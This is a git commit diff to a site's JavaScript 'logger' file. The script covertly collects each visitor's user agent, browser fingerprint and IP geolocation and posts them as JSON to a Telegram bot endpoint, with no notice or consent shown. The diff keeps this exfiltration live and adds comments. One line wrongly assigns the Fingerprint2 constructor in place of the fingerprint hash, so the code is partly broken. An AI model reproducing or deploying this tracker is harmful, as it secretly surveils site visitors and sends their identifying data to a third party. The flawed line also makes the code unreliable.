1392c93795f771974387d8e24f1ec82eb9c57a58
xaferima <xaferima@gmail.com>
2022-07-10 12:51:01 -0500

    Adding changes

--- assets/js/logger/logger.js
+++ assets/js/logger/logger.js
@@ -2,31 +2,25 @@
 var userData = {
     "IP": [],
     "fingerprintHash": '',
-    "userAgent": navigator.userAgent
+    "userAgent": navigator.userAgent            //JSAON DATA
 }
 
 
 new Fingerprint2().get(function(fingerprint, components){
-  // this will use all available fingerprinting sources
-  userData.fingerprintHash = fingerprint
-    
-  // components is an array of all fingerprinting components used
+  userData.fingerprintHash = Fingerprint2       //GETTING FINGER PRINT
 });
 
 
-var sendIpsTelegram = function(token, chatID){
-    console.log(process.env.TELEGRAM_TOKEN)
+var sendIpsTelegram = function(token, chatID){                                      // TO SEND INFO BY A TELEGRAM BOT
     endpoint='https://api.telegram.org/'+token+'/sendMessage';
-    $.getJSON('https://json.geoiplookup.io/?callback=?', function(dataIP) {
+    $.getJSON('https://json.geoiplookup.io/?callback=?', function(dataIP) {         //GETTING IP INFO BY GEOIPLOOKUP
       userData.IP=dataIP;
     });
     setTimeout(function(){
         var xhr = new XMLHttpRequest();
         xhr.open("POST", endpoint, true);
         xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
-        // send the collected data as JSON
-  //      xhr.send(JSON.stringify(userData));
-        data={'chat_id': chatID, 'text': userData}
+        data={'chat_id': chatID, 'text': userData}                                  //DATA
         xhr.send(JSON.stringify(data));
         xhr.onloadend = function () {
         // done
